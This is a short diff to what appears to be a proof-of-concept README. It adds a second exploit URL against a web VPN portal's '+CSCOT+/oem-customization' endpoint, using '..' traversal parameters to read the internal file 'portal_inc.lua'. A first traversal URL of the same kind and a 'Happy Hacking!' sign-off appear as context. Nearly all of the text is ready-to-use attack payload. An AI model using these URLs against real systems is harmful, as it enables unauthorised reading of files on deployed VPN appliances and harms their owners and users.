@@ -8,3 +8,9 @@ https://<domain>/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/port
 
 Happy Hacking!
 ```
+
+
+```
+POC #2: 
+https://<domain>/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
+```
